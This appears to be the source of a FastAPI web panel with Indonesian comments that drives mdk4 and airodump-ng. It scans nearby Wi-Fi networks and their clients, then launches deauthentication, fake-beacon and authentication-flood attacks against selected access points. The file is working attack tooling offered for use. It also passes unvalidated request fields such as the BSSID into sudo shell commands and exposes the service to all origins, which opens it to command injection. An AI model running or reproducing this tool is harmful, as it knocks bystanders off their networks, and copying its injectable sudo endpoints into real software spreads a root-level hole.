from fastapi import FastAPI, HTTPException
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import List, Optional
import subprocess
import os
import time
import signal
import sys
import glob
import threading
import tempfile
import uvicorn
import logging
import traceback

# ====================== SETUP ======================
app = FastAPI(title="MDK4 Web API", version="1.0")

# CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ====================== AMBIL INTERFACE DARI ENVIRONMENT ======================
MDK4_INTERFACE = os.environ.get("MDK4_INTERFACE", None)

if MDK4_INTERFACE:
    logger.info(f"Using interface from environment: {MDK4_INTERFACE}")

# ====================== MODELS ======================
class Target(BaseModel):
    bssid: str
    channel: str
    essid: str
    power: Optional[int] = None

class AttackRequest(BaseModel):
    type: str
    targets: List[Target] = []
    interface: str

class MonitorData(BaseModel):
    clients: List[dict] = []
    ap_status: str = "unknown"
    packets_sent: int = 0
    last_update: Optional[float] = None

# ====================== STATE ======================
class AttackState:
    def __init__(self):
        self.process = None
        self.running = False
        self.type = None
        self.targets = []
        self.monitor_thread = None
        self.monitor_running = False
        self.monitor_data = MonitorData()
        self.monitor_iface = MDK4_INTERFACE  # 🔥 Ambil dari environment
        self.original_iface = None
        self.temp_files = []

state = AttackState()

# ====================== INTERFACE FUNCTIONS ======================
def find_wireless_interfaces():
    """Cari semua interface wireless pake ip link + iw dev + iwconfig"""
    interfaces = []
    
    # Method 1: Pake iw dev (paling akurat)
    try:
        result = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=5)
        for line in result.stdout.split('\n'):
            if "Interface" in line:
                iface = line.split()[1]
                if iface and iface not in interfaces:
                    interfaces.append(iface)
    except:
        pass
    
    # Method 2: Pake ip link (fallback)
    try:
        result = subprocess.run(["ip", "link"], capture_output=True, text=True, timeout=5)
        for line in result.stdout.split('\n'):
            if "state UP" in line or "state DOWN" in line:
                import re
                match = re.search(r':\s+([a-zA-Z0-9_.-]+):', line)
                if match:
                    iface = match.group(1)
                    if iface not in ["lo", "eth0", "eth1", "enp0s3", "enp0s8", "docker0"]:
                        if iface not in interfaces:
                            interfaces.append(iface)
    except:
        pass
    
    # Method 3: Pake iwconfig (buat yg gak kedeteksi)
    try:
        result = subprocess.run(["iwconfig"], capture_output=True, text=True, timeout=5)
        for line in result.stdout.split('\n'):
            if "no wireless extensions" in line:
                continue
            if line.strip() and not line.startswith(" "):
                iface = line.split()[0]
                if iface not in interfaces and iface not in ["lo", "eth0", "eth1"]:
                    interfaces.append(iface)
    except:
        pass
    
    # Filter cuma interface wireless
    wireless_ifaces = []
    for iface in interfaces:
        try:
            result = subprocess.run(["iw", "dev", iface, "info"], capture_output=True, text=True, timeout=2)
            if result.returncode == 0 and "wiphy" in result.stdout:
                wireless_ifaces.append(iface)
            else:
                result2 = subprocess.run(["iwconfig", iface], capture_output=True, text=True, timeout=2)
                if "no wireless extensions" not in result2.stdout:
                    wireless_ifaces.append(iface)
        except:
            pass
    
    return wireless_ifaces if wireless_ifaces else interfaces

def is_monitor_mode(iface):
    try:
        result = subprocess.run(["iwconfig", iface], capture_output=True, text=True, timeout=3)
        return "Mode:Monitor" in result.stdout
    except:
        return False

def get_monitor_interface():
    # 🔥 Cek state dulu (dari environment)
    if state.monitor_iface and is_monitor_mode(state.monitor_iface):
        return state.monitor_iface
    
    interfaces = find_wireless_interfaces()
    for iface in interfaces:
        if is_monitor_mode(iface):
            state.monitor_iface = iface
            return iface
    
    # 🔥 Jangan force bikin monitor, biarkan user pilih di web
    # Tapi kalau diminta, coba bikin
    for iface in interfaces:
        if not iface.startswith("mon") and not iface.endswith("mon"):
            try:
                logger.info(f"Attempting to create monitor on {iface}...")
                subprocess.run(["sudo", "airmon-ng", "check", "kill"], check=False, timeout=5)
                result = subprocess.run(
                    ["sudo", "airmon-ng", "start", iface], 
                    capture_output=True, text=True, timeout=10
                )
                for line in result.stdout.split('\n'):
                    if "monitor mode enabled on" in line:
                        parts = line.split()
                        for i, part in enumerate(parts):
                            if part == "on" and i+1 < len(parts):
                                new_iface = parts[i+1].strip()
                                state.monitor_iface = new_iface
                                logger.info(f"Created monitor interface: {new_iface}")
                                return new_iface
            except Exception as e:
                logger.error(f"Failed to create monitor on {iface}: {e}")
                continue
    
    # 🔥 Kalau gak ada sama sekali, return None (bukan exception)
    logger.warning("No monitor interface available")
    return None

def cleanup_monitor():
    if state.monitor_iface:
        try:
            subprocess.run(["sudo", "airmon-ng", "stop", state.monitor_iface], check=False, timeout=5)
            subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], check=False, timeout=5)
        except:
            pass

# ====================== PARSE CSV ======================
def parse_csv(filename):
    networks, clients = [], []
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
    except:
        return networks, clients
    
    parsing_networks = False
    parsing_clients = False
    
    for line in lines:
        if "bssid" in line.lower() and "channel" in line.lower():
            parsing_networks = True
            parsing_clients = False
            continue
        if "station mac" in line.lower():
            parsing_networks = False
            parsing_clients = True
            continue
        if not line.strip():
            continue
        
        if parsing_networks:
            parts = line.split(',')
            if len(parts) >= 14:
                bssid = parts[0].strip()
                channel = parts[3].strip()
                essid = parts[13].strip()
                power_str = parts[8].strip() if len(parts) > 8 else ''
                try:
                    power = int(power_str)
                except:
                    power = None
                if bssid and len(bssid) == 17 and ":" in bssid:
                    networks.append({
                        "bssid": bssid,
                        "channel": channel if channel else "?",
                        "essid": essid if essid else "[Hidden]",
                        "power": power
                    })
            
        if parsing_clients:
            parts = line.split(',')
            if len(parts) >= 7:
                bssid = parts[0].strip()
                station = parts[1].strip() if len(parts) > 1 else ""
                power = parts[2].strip() if len(parts) > 2 else ""
                packets = parts[4].strip() if len(parts) > 4 else ""
                if bssid and len(bssid) == 17 and ":" in bssid:
                    clients.append({
                        "bssid": bssid,
                        "station": station,
                        "power": power,
                        "packets": packets
                    })
    
    return networks, clients

def parse_csv_scan(filename):
    networks = []
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
    except:
        return networks
    
    start = False
    for line in lines:
        if "bssid" in line.lower() and "channel" in line.lower():
            start = True
            continue
        if start:
            if not line.strip() or "station mac" in line.lower():
                break
            parts = line.split(',')
            if len(parts) >= 14:
                bssid = parts[0].strip()
                if bssid and len(bssid) == 17 and ":" in bssid:
                    networks.append({
                        "bssid": bssid,
                        "channel": parts[3].strip() if len(parts) > 3 else "?",
                        "essid": parts[13].strip() if len(parts) > 13 else "[Hidden]",
                        "power": int(parts[8].strip()) if len(parts) > 8 and parts[8].strip().lstrip('-').isdigit() else None
                    })
    return networks

# ====================== MONITOR THREAD ======================
def monitor_loop():
    logger.info("Monitor thread started")
    state.monitor_running = True
    
    while state.monitor_running:
        try:
            if not state.targets or not state.monitor_iface:
                time.sleep(2)
                continue
            
            target = state.targets[0]
            bssid = target.get('bssid')
            if not bssid:
                time.sleep(2)
                continue
            
            temp_file = "/tmp/monitor_output"
            cmd = f"sudo timeout 5 airodump-ng {state.monitor_iface} --bssid {bssid} -w {temp_file} --output-format csv 2>/dev/null"
            subprocess.run(cmd, shell=True, capture_output=True, timeout=8)
            
            csv_file = f"{temp_file}-01.csv"
            if os.path.exists(csv_file):
                _, clients = parse_csv(csv_file)
                state.monitor_data.clients = clients
                state.monitor_data.last_update = time.time()
                state.monitor_data.ap_status = "online" if clients else "⚠️ AP OFFLINE"
                try:
                    os.remove(csv_file)
                except:
                    pass
            
        except Exception as e:
            logger.error(f"Monitor error: {e}")
        
        time.sleep(3)

# ====================== HELPER FUNCTIONS ======================
def find_ssid_file():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    paths = [
        os.path.join(script_dir, "ssid-fake", "ssid_list.txt"),
        os.path.join(script_dir, "ssid_list.txt"),
    ]
    for path in paths:
        if os.path.exists(path):
            return path
    return None

def stop_attack_internal():
    """Stop attack - dijalankan di background biar gak blocking"""
    logger.info("Stopping attack...")
    state.running = False
    
    # Stop monitor
    state.monitor_running = False
    if state.monitor_thread and state.monitor_thread.is_alive():
        try:
            state.monitor_thread.join(timeout=3)
        except:
            pass
        state.monitor_thread = None
    
    # Kill process
    if state.process:
        try:
            if state.process.poll() is None:
                os.killpg(os.getpgid(state.process.pid), signal.SIGTERM)
                state.process.wait(timeout=3)
        except:
            pass
        state.process = None
    
    # Pkill
    try:
        subprocess.run("sudo pkill -f mdk4", shell=True, check=False, timeout=5)
    except:
        subprocess.run("sudo pkill -9 -f mdk4", shell=True, check=False)
    
    # Clean temp files
    for f in state.temp_files:
        try:
            os.remove(f)
        except:
            pass
    state.temp_files = []
    
    # Reset
    state.monitor_data = MonitorData()
    state.targets = []
    
    logger.info("Attack stopped")

def stop_attack_async():
    """Stop attack di background thread - GA NYEBABIN TIMEOUT"""
    thread = threading.Thread(target=stop_attack_internal)
    thread.daemon = True
    thread.start()
    return thread

# ====================== API ROUTES ======================

@app.get("/", response_class=HTMLResponse)
async def root():
    """Root - load index.html langsung"""
    try:
        script_dir = os.path.dirname(os.path.abspath(__file__))
        index_path = os.path.join(script_dir, "templates", "index.html")
        
        if os.path.exists(index_path):
            with open(index_path, "r", encoding="utf-8") as f:
                html_content = f.read()
            return HTMLResponse(content=html_content, status_code=200)
        else:
            return HTMLResponse(
                content=f"<h1>Error: index.html not found at {index_path}</h1>", 
                status_code=404
            )
    except Exception as e:
        logger.error(f"Root error: {e}")
        traceback.print_exc()
        return HTMLResponse(
            content=f"<h1>Error: {e}</h1>", 
            status_code=500
        )

@app.get("/api/interfaces")
async def get_interfaces():
    try:
        interfaces = find_wireless_interfaces()
        monitor = get_monitor_interface() if interfaces else None
        return {
            "status": "success",
            "interfaces": interfaces,
            "monitor": monitor
        }
    except Exception as e:
        logger.error(f"Interfaces error: {e}")
        return JSONResponse(
            status_code=500,
            content={"status": "error", "message": str(e)}
        )

@app.get("/api/scan")
async def scan_networks(duration: int = 10):
    try:
        interface = get_monitor_interface()
        if not interface:
            return JSONResponse(
                status_code=400,
                content={"status": "error", "message": "No monitor interface available"}
            )
        
        logger.info(f"Scanning with {interface}")
        
        for f in glob.glob("/tmp/scan_output*.csv"):
            try:
                os.remove(f)
            except:
                pass
        
        cmd = f"timeout {duration+2} sudo airodump-ng {interface} -w /tmp/scan_output --output-format csv"
        subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=duration+5)
        
        networks = []
        for f in ["/tmp/scan_output-01.csv", "/tmp/scan_output.csv"]:
            if os.path.exists(f):
                networks = parse_csv_scan(f)
                if networks:
                    break
        
        if networks:
            networks.sort(key=lambda x: x.get('power', -1000), reverse=True)
            return {"status": "success", "networks": networks}
        else:
            return {"status": "error", "message": "No networks found"}
            
    except Exception as e:
        logger.error(f"Scan error: {e}")
        return JSONResponse(
            status_code=500,
            content={"status": "error", "message": str(e)}
        )

# ====================== CLIENT SCAN ======================
@app.get("/api/clients")
async def get_clients(bssid: str, channel: Optional[str] = None, interface: Optional[str] = None):
    """
    Scan clients yang terhubung ke AP tertentu
    """
    try:
        if not bssid:
            raise HTTPException(status_code=400, detail="BSSID required")
        
        iface = interface or get_monitor_interface()
        if not iface:
            raise HTTPException(status_code=400, detail="No interface available")
        
        # Set channel dulu
        if channel and channel != "?":
            try:
                subprocess.run(["iwconfig", iface, "channel", str(channel)], 
                             capture_output=True, timeout=2)
                logger.info(f"Set channel to {channel} for {bssid}")
            except Exception as e:
                logger.warning(f"Failed to set channel: {e}")
        
        logger.info(f"Scanning clients for {bssid} on {iface}")
        
        temp_file = "/tmp/client_scan"
        clients = []
        
        # Retry 2 kali kalau timeout
        for attempt in range(2):
            cmd = f"sudo timeout 8 airodump-ng {iface} --bssid {bssid} -w {temp_file} --output-format csv 2>/dev/null"
            try:
                subprocess.run(cmd, shell=True, capture_output=True, timeout=10)
                break
            except subprocess.TimeoutExpired:
                logger.warning(f"Client scan attempt {attempt+1} timeout for {bssid}")
                if attempt == 0:
                    time.sleep(1)
                else:
                    return {
                        "status": "success",
                        "bssid": bssid,
                        "clients": [],
                        "count": 0,
                        "message": "Scan timeout - AP mungkin tidak aktif"
                    }
        
        csv_file = f"{temp_file}-01.csv"
        if os.path.exists(csv_file):
            _, clients = parse_csv(csv_file)
            try:
                os.remove(csv_file)
            except:
                pass
        
        return {
            "status": "success",
            "bssid": bssid,
            "clients": clients,
            "count": len(clients)
        }
        
    except Exception as e:
        logger.error(f"Client scan error: {e}")
        traceback.print_exc()
        return JSONResponse(
            status_code=500,
            content={"status": "error", "message": str(e)}
        )

# ====================== ATTACK ROUTES ======================
@app.post("/api/attack/start")
async def start_attack(req: AttackRequest):
    try:
        if state.running:
            raise HTTPException(status_code=400, detail="Attack already running")
        
        if not req.interface:
            raise HTTPException(status_code=400, detail="No interface selected")
        
        if not req.type:
            raise HTTPException(status_code=400, detail="No attack type selected")
        
        # 🔥 POWER AMAN + NICE PRIORITY
        cmd = None
        if req.type == "deauth":
            if req.targets:
                target_file = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt')
                for target in req.targets:
                    target_file.write(f"{target.bssid},{target.channel}\n")
                target_file.close()
                state.temp_files.append(target_file.name)
                cmd = ["sudo", "nice", "-n", "19", "mdk4", req.interface, "d", "-B", target_file.name, "-c", "h", "-s", "200"]
                state.targets = [t.dict() for t in req.targets]
            else:
                cmd = ["sudo", "nice", "-n", "19", "mdk4", req.interface, "d", "-c", "h", "-s", "200"]
                state.targets = []
                
        elif req.type == "beacon":
            ssid_file = find_ssid_file()
            if not ssid_file:
                raise HTTPException(status_code=400, detail="ssid_list.txt not found in ssid-fake folder")
            cmd = ["sudo", "nice", "-n", "19", "mdk4", req.interface, "b", "-f", ssid_file, "-w", "a", "-m", "-s", "200"]
            state.targets = []
            
        elif req.type == "authdos":
            if not req.targets:
                raise HTTPException(status_code=400, detail="Auth DOS needs 1 target")
            target = req.targets[0]
            cmd = ["sudo", "nice", "-n", "19", "mdk4", req.interface, "a", "-a", target.bssid, "-s", "500"]
            state.targets = [target.dict()]
        
        if not cmd:
            raise HTTPException(status_code=400, detail="Invalid attack type")
        
        logger.info(f"Starting: {' '.join(cmd)}")
        state.process = subprocess.Popen(cmd, preexec_fn=os.setsid)
        state.running = True
        state.type = req.type
        
        # 🔥 Update monitor interface
        if req.interface and not state.monitor_iface:
            state.monitor_iface = req.interface
        
        if state.targets:
            if state.monitor_thread is None or not state.monitor_thread.is_alive():
                state.monitor_thread = threading.Thread(target=monitor_loop)
                state.monitor_thread.daemon = True
                state.monitor_thread.start()
        
        return {
            "status": "success",
            "message": f"{req.type} attack started",
            "targets": len(state.targets)
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Start error: {e}")
        traceback.print_exc()
        return JSONResponse(
            status_code=500,
            content={"status": "error", "message": str(e)}
        )

@app.post("/api/attack/stop")
async def stop_attack():
    try:
        if state.running:
            stop_attack_async()
            return {"status": "success", "message": "Attack stopping..."}
        else:
            return {"status": "success", "message": "No attack running"}
    except Exception as e:
        logger.error(f"Stop error: {e}")
        traceback.print_exc()
        return JSONResponse(
            status_code=500,
            content={"status": "error", "message": str(e)}
        )

@app.post("/api/attack/force_stop")
async def force_stop():
    """Force stop - langsung kill semua proses"""
    try:
        logger.info("Force stopping all processes...")
        
        subprocess.run("sudo pkill -9 -f mdk4", shell=True, check=False)
        subprocess.run("sudo pkill -9 -f aireplay-ng", shell=True, check=False)
        subprocess.run("sudo pkill -9 -f airodump-ng", shell=True, check=False)
        
        state.running = False
        if state.process:
            try:
                state.process.kill()
            except:
                pass
            state.process = None
        
        state.monitor_running = False
        if state.monitor_thread and state.monitor_thread.is_alive():
            try:
                state.monitor_thread.join(timeout=2)
            except:
                pass
            state.monitor_thread = None
        
        state.monitor_data = MonitorData()
        state.targets = []
        
        return {"status": "success", "message": "Force stopped"}
    except Exception as e:
        return JSONResponse(
            status_code=500,
            content={"status": "error", "message": str(e)}
        )

@app.get("/api/attack/status")
async def attack_status():
    return {
        "running": state.running,
        "type": state.type,
        "targets": state.targets,
        "target_count": len(state.targets)
    }

@app.get("/api/monitor")
async def get_monitor():
    return {
        "status": "success",
        "data": state.monitor_data.dict()
    }

# ====================== CLEANUP ======================
def cleanup():
    logger.info("Cleaning up...")
    
    state.running = False
    state.monitor_running = False
    
    if state.monitor_thread and state.monitor_thread.is_alive():
        try:
            state.monitor_thread.join(timeout=2)
        except:
            pass
        state.monitor_thread = None
    
    if state.process:
        try:
            if state.process.poll() is None:
                os.killpg(os.getpgid(state.process.pid), signal.SIGTERM)
                state.process.wait(timeout=2)
        except:
            pass
        state.process = None
    
    try:
        subprocess.run("sudo pkill -9 -f mdk4", shell=True, check=False)
    except:
        pass
    
    for f in state.temp_files:
        try:
            os.remove(f)
        except:
            pass
    state.temp_files = []
    
    state.monitor_data = MonitorData()
    state.targets = []
    
    if state.monitor_iface:
        try:
            subprocess.run(["sudo", "airmon-ng", "stop", state.monitor_iface], check=False, timeout=3)
            subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], check=False, timeout=3)
        except:
            pass
    
    logger.info("Cleanup complete")

def signal_handler(sig, frame):
    print("\n[*] Shutting down...")
    cleanup()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

# ====================== MAIN ======================
if __name__ == "__main__":
    try:
        # 🔥 Jangan force bikin monitor di startup
        # Biarkan user pilih interface manual di web
        interfaces = find_wireless_interfaces()
        if interfaces:
            logger.info(f"Found interfaces: {interfaces}")
            logger.info("Select interface from web interface")
            
            # Coba cari monitor interface yang sudah ada
            for iface in interfaces:
                if is_monitor_mode(iface):
                    state.monitor_iface = iface
                    logger.info(f"Found existing monitor interface: {iface}")
                    break
        else:
            logger.warning("No wireless interfaces found! Please plug in WiFi adapter.")
        
        # 🔥 Tapi kalau udah ada dari environment, pake itu
        if MDK4_INTERFACE:
            logger.info(f"Using interface from environment: {MDK4_INTERFACE}")
            state.monitor_iface = MDK4_INTERFACE
        
        uvicorn.run(app, host="0.0.0.0", port=5000, log_level="info")
    except Exception as e:
        logger.error(f"Fatal error: {e}")
        traceback.print_exc()
        cleanup()
        sys.exit(1)